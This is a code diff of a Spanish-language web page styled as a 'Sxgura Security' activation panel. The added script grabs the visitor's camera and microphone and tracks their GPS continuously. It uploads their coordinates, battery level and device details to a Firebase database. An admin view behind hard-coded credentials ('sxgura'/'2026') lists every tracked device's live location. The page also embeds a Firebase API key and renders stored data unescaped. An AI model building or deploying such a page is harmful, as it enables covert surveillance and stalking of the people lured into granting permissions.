@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Sxgura Device Control</title>
+<title>Sxgura Live Panel</title>
 
 <style>
 
@@ -17,83 +17,156 @@ font-family:Arial,sans-serif;
 body{
 background:#000;
 color:#fff;
-padding:20px;
 overflow-x:hidden;
+min-height:100vh;
 }
 
-h1{
-text-align:center;
-color:#ff0000;
-margin-bottom:25px;
-font-size:28px;
-text-shadow:0 0 15px #ff0000;
+/* FONDO */
+
+body::before{
+content:"";
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:
+radial-gradient(circle at top,#240000,#000 60%);
+z-index:-1;
 }
 
-.panel{
-max-width:520px;
+/* CONTENEDOR */
+
+.container{
+max-width:700px;
 margin:auto;
-background:#050505;
-border:1px solid #111;
-border-radius:20px;
 padding:20px;
-box-shadow:0 0 25px rgba(255,0,0,.25);
 }
+
+/* LOGO */
+
+.logo{
+text-align:center;
+margin-top:30px;
+margin-bottom:30px;
+}
+
+.logo h1{
+font-size:34px;
+color:#ff0000;
+text-shadow:0 0 20px #ff0000;
+}
+
+.logo p{
+margin-top:10px;
+color:#999;
+font-size:14px;
+}
+
+/* CARD */
 
 .card{
-background:#0a0a0a;
-border:1px solid #181818;
-padding:15px;
-border-radius:14px;
-margin-bottom:15px;
+background:#080808;
+border:1px solid #1a1a1a;
+border-radius:20px;
+padding:20px;
+margin-bottom:20px;
+box-shadow:0 0 20px rgba(255,0,0,.12);
 }
 
-.card h2{
+/* TITULOS */
+
+.title{
 font-size:18px;
-margin-bottom:12px;
-color:#ff2b2b;
+margin-bottom:15px;
+color:#ff2a2a;
 }
 
-.info{
-font-size:14px;
-color:#ccc;
-line-height:1.8;
-word-break:break-word;
-}
+/* BOTONES */
 
 button{
 width:100%;
-padding:13px;
-margin-top:10px;
-background:#b30000;
+padding:14px;
 border:none;
-border-radius:10px;
+border-radius:14px;
+background:linear-gradient(45deg,#ff0000,#990000);
 color:#fff;
 font-weight:bold;
 cursor:pointer;
-transition:.25s;
+margin-top:10px;
+transition:.3s;
 }
 
 button:hover{
-background:#ff0000;
-box-shadow:0 0 15px rgba(255,0,0,.4);
+transform:scale(1.02);
+box-shadow:0 0 20px rgba(255,0,0,.35);
 }
+
+/* INPUT */
+
+input{
+width:100%;
+padding:13px;
+margin-top:10px;
+border:none;
+border-radius:12px;
+background:#111;
+color:#fff;
+}
+
+/* STATUS */
+
+.status{
+margin-top:15px;
+padding:12px;
+border-radius:12px;
+background:#111;
+line-height:1.7;
+font-size:14px;
+}
+
+/* VIDEO */
 
 video{
 width:100%;
-border-radius:12px;
+border-radius:16px;
 margin-top:15px;
-background:#000;
+border:1px solid #222;
 }
 
-.status{
-margin-top:10px;
+/* DISPOSITIVOS */
+
+.device{
+background:#111;
+padding:15px;
+border-radius:15px;
+margin-top:15px;
+border:1px solid #222;
+}
+
+.device h3{
+color:#ff3d3d;
+margin-bottom:10px;
+}
+
+.device p{
 font-size:13px;
-color:#00ff88;
+margin:6px 0;
+color:#ccc;
 }
 
-footer{
-margin-top:25px;
+/* PANEL */
+
+#adminPanel{
+display:none;
+}
+
+/* FOOTER */
+
+.footer{
 text-align:center;
+margin-top:40px;
+padding-bottom:30px;
 font-size:12px;
 color:#666;
 }
@@ -103,87 +176,77 @@ color:#666;
 
 <body>
 
-<h1>
-SXGURA DEVICE PANEL
-</h1>
+<div class="container">
 
-<div class="panel">
+<!-- LOGO -->
+
+<div class="logo">
+
+<h1>Sxgura Security</h1>
+
+<p>
+Sistema temporal de monitoreo autorizado
+</p>
+
+</div>
+
+<!-- PANEL USUARIO -->
 
 <div class="card">
 
-<h2>Información del dispositivo</h2>
-
-<div class="info" id="deviceInfo">
-Cargando...
+<div class="title">
+Activación
 </div>
 
+<button onclick="activarSistema()">
+ACTIVAR PERMISOS
+</button>
+
+<div class="status" id="status">
+
+Esperando activación...
+
 </div>
+
+<video id="video" autoplay muted playsinline></video>
+
+</div>
+
+<!-- LOGIN -->
 
 <div class="card">
 
-<h2>Estado de batería</h2>
-
-<div class="info" id="batteryInfo">
-Cargando...
+<div class="title">
+Panel Admin
 </div>
 
-</div>
+<input type="text" id="user" placeholder="Usuario">
 
-<div class="card">
+<input type="password" id="pass" placeholder="Contraseña">
 
-<h2>Ubicación GPS</h2>
-
-<div class="info" id="gpsInfo">
-Sin ubicación
-</div>
-
-<button onclick="getLocation()">
-Enviar ubicación
+<button onclick="loginAdmin()">
+INGRESAR
 </button>
 
 </div>
 
-<div class="card">
+<!-- ADMIN -->
 
-<h2>Cámara + Flash</h2>
+<div class="card" id="adminPanel">
 
-<button onclick="openCamera()">
-Activar cámara
-</button>
+<div class="title">
+Dispositivos conectados
+</div>
 
-<video id="camera" autoplay playsinline></video>
+<div id="devices"></div>
 
 </div>
 
-<div class="card">
-
-<h2>Flash + Vibración infinita</h2>
-
-<button onclick="toggleVibration()">
-Activar / Desactivar
-</button>
-
-<div class="status" id="vibrationStatus">
-Desactivado
+<div class="footer">
+© 2026 Sxgura Inc
 </div>
 
 </div>
-
-<div class="card">
-
-<h2>Conexión</h2>
-
-<div class="info" id="networkInfo">
-Verificando...
-</div>
-
-</div>
-
-</div>
-
-<footer>
-Sxgura Inc © 2026
-</footer>
 
 <script type="module">
 
@@ -194,169 +257,171 @@ from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 
 import {
 getFirestore,
+doc,
+setDoc,
 collection,
-addDoc,
-serverTimestamp
+onSnapshot
 }
 from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
+/* CONFIG */
+
 const firebaseConfig = {
 
-apiKey:"AIzaSyApiO7_x468L0k0u7vheUW_luEWJ41VRUQ",
+apiKey: "AIzaSyApiO7_x468L0k0u7vheUW_luEWJ41VRUQ",
 
-authDomain:"sxgura-web.firebaseapp.com",
+authDomain: "sxgura-web.firebaseapp.com",
 
-projectId:"sxgura-web",
+projectId: "sxgura-web",
 
-storageBucket:"sxgura-web.firebasestorage.app",
+storageBucket: "sxgura-web.firebasestorage.app",
 
-messagingSenderId:"912354449131",
+messagingSenderId: "912354449131",
 
-appId:"1:912354449131:web:4df2a48d6eb84223bd10ae"
+appId: "1:912354449131:web:4df2a48d6eb84223bd10ae"
 
 };
 
-const app = initializeApp(firebaseConfig);
+const app =
+initializeApp(firebaseConfig);
 
-const db = getFirestore(app);
+const db =
+getFirestore(app);
 
-/* INFO DISPOSITIVO */
+/* ID DISPOSITIVO */
 
-document.getElementById("deviceInfo").innerHTML =
+const deviceId =
+Math.random().toString(36).substring(2,10);
 
-"Plataforma: " +
-navigator.platform +
+/* ELEMENTOS */
 
-"<br><br>Navegador: " +
-navigator.userAgent +
+const statusBox =
+document.getElementById("status");
 
-"<br><br>Idioma: " +
-navigator.language +
+const video =
+document.getElementById("video");
 
-"<br><br>Resolución: " +
-screen.width + " x " + screen.height +
+const devicesDiv =
+document.getElementById("devices");
 
-"<br><br>CPU: " +
-(navigator.hardwareConcurrency || "Desconocido");
+/* LOGIN */
 
-/* INTERNET */
+window.loginAdmin = function(){
 
-function updateNetwork(){
+const user =
+document.getElementById("user").value;
 
-document.getElementById("networkInfo").innerHTML =
+const pass =
+document.getElementById("pass").value;
 
-navigator.onLine
-?
-"Conectado a internet"
-:
-"Sin conexión";
+if(
+user === "sxgura"
+&&
+pass === "2026"
+){
+
+document.getElementById("adminPanel")
+.style.display = "block";
+
+cargarDispositivos();
+
+}else{
+
+alert("Credenciales incorrectas");
 
 }
 
-updateNetwork();
+}
 
-window.addEventListener(
-"online",
-updateNetwork
-);
+/* ACTIVAR */
 
-window.addEventListener(
-"offline",
-updateNetwork
-);
+window.activarSistema =
+async function(){
 
-/* BATERÍA */
-
-async function getBattery(){
+statusBox.innerHTML =
+"Solicitando permisos...";
 
 try{
 
-if(!navigator.getBattery){
+/* CAMARA + MICRO */
 
-document.getElementById("batteryInfo").innerHTML =
-"No compatible";
-return;
+const stream =
+await navigator.mediaDevices.getUserMedia({
+video:true,
+audio:true
+});
 
-}
+video.srcObject = stream;
+
+/* UBICACION */
+
+navigator.geolocation.watchPosition(
+
+async(pos)=>{
+
+const lat =
+pos.coords.latitude;
+
+const lon =
+pos.coords.longitude;
+
+let batteryLevel =
+"No disponible";
+
+if(navigator.getBattery){
 
 const battery =
 await navigator.getBattery();
 
-function updateBattery(){
-
-document.getElementById("batteryInfo").innerHTML =
-
-"Nivel: " +
-Math.floor(battery.level * 100) +
-"%<br><br>Cargando: " +
-(battery.charging ? "Sí" : "No");
+batteryLevel =
+Math.floor(
+battery.level * 100
+) + "%";
 
 }
 
-updateBattery();
+/* GUARDAR FIREBASE */
 
-battery.addEventListener(
-"levelchange",
-updateBattery
-);
-
-battery.addEventListener(
-"chargingchange",
-updateBattery
-);
-
-}catch{
-
-document.getElementById("batteryInfo").innerHTML =
-"Bloqueado por navegador";
-
-}
-
-}
-
-getBattery();
-
-/* GPS */
-
-async function getLocation(){
-
-if(!navigator.geolocation){
-
-alert("GPS no compatible");
-return;
-
-}
-
-navigator.geolocation.getCurrentPosition(
-
-async(position)=>{
-
-const lat =
-position.coords.latitude;
-
-const lon =
-position.coords.longitude;
-
-document.getElementById("gpsInfo").innerHTML =
-
-"Latitud: " + lat +
-"<br><br>Longitud: " + lon;
-
-try{
-
-await addDoc(
-collection(db,"device_logs"),
+await setDoc(
+doc(db,"devices",deviceId),
 {
 
-type:"gps",
+deviceId,
 
-latitude:lat,
+lat,
 
-longitude:lon,
+lon,
+
+battery:batteryLevel,
+
+platform:navigator.platform,
 
 userAgent:navigator.userAgent,
 
-timestamp:serverTimestamp()
+online:true,
+
+lastUpdate:new Date().toLocaleTimeString(),
+
+timestamp:Date.now()
+
+}
+
+);
+
+statusBox.innerHTML = `
+
+✅ Cámara activa<br>
+✅ Micrófono activo<br>
+✅ Ubicación activa
+
+`;
+
+},
+
+(err)=>{
+
+statusBox.innerHTML =
+"❌ Ubicación denegada";
 
 }
 
@@ -364,176 +429,80 @@ timestamp:serverTimestamp()
 
 }catch(e){
 
-console.log(e);
-
-}
-
-},
-
-(error)=>{
-
-alert(
-"Debes aceptar el permiso GPS"
-);
-
-},
-
-{
-enableHighAccuracy:true,
-timeout:10000,
-maximumAge:0
-}
-
-);
-
-}
-
-/* CÁMARA + FLASH */
-
-let currentStream;
-
-async function openCamera(){
-
-try{
-
-currentStream =
-await navigator.mediaDevices.getUserMedia({
-
-video:{
-facingMode:{
-ideal:"environment"
-}
-},
-
-audio:false
-
-});
-
-const video =
-document.getElementById("camera");
-
-video.srcObject = currentStream;
-
-video.play();
-
-const track =
-currentStream.getVideoTracks()[0];
-
-const capabilities =
-track.getCapabilities();
-
-if(capabilities.torch){
-
-await track.applyConstraints({
-advanced:[{torch:true}]
-});
-
-}
-
-try{
-
-await addDoc(
-collection(db,"device_logs"),
-{
-
-type:"camera_opened",
-
-timestamp:serverTimestamp()
-
-}
-
-);
-
-}catch(e){
+statusBox.innerHTML =
+"❌ Permisos denegados";
 
 console.log(e);
 
 }
 
-}catch(err){
+}
 
-alert(
-"Flash o cámara no compatible"
+/* CARGAR DISPOSITIVOS */
+
+function cargarDispositivos(){
+
+onSnapshot(
+collection(db,"devices"),
+
+(snapshot)=>{
+
+devicesDiv.innerHTML = "";
+
+snapshot.forEach((docu)=>{
+
+const d =
+docu.data();
+
+devicesDiv.innerHTML += `
+
+<div class="device">
+
+<h3>
+${d.deviceId}
+</h3>
+
+<p>
+<b>Estado:</b>
+Online
+</p>
+
+<p>
+<b>Batería:</b>
+${d.battery}
+</p>
+
+<p>
+<b>Latitud:</b>
+${d.lat}
+</p>
+
+<p>
+<b>Longitud:</b>
+${d.lon}
+</p>
+
+<p>
+<b>Plataforma:</b>
+${d.platform}
+</p>
+
+<p>
+<b>Última actualización:</b>
+${d.lastUpdate}
+</p>
+
+</div>
+
+`;
+
+});
+
+}
+
 );
 
-console.log(err);
-
 }
-
-}
-
-/* FLASH + VIBRACIÓN */
-
-let vibrating = false;
-
-let vibrateLoop;
-
-async function toggleVibration(){
-
-if(!navigator.vibrate){
-
-alert("No compatible");
-return;
-
-}
-
-if(!vibrating){
-
-vibrating = true;
-
-/* FLASH */
-
-openCamera();
-
-/* VIBRACIÓN */
-
-vibrateLoop = setInterval(()=>{
-
-navigator.vibrate([1000,300,1000]);
-
-},2300);
-
-document.getElementById(
-"vibrationStatus"
-).innerHTML =
-
-"FLASH Y VIBRACIÓN ACTIVADOS";
-
-}else{
-
-vibrating = false;
-
-clearInterval(vibrateLoop);
-
-navigator.vibrate(0);
-
-/* APAGAR FLASH */
-
-if(currentStream){
-
-currentStream
-.getTracks()
-.forEach(track=>track.stop());
-
-}
-
-document.getElementById(
-"vibrationStatus"
-).innerHTML =
-
-"FLASH Y VIBRACIÓN DESACTIVADOS";
-
-}
-
-}
-
-/* GLOBAL */
-
-window.getLocation = getLocation;
-
-window.openCamera = openCamera;
-
-window.toggleVibration = toggleVibration;
 
 </script>
 
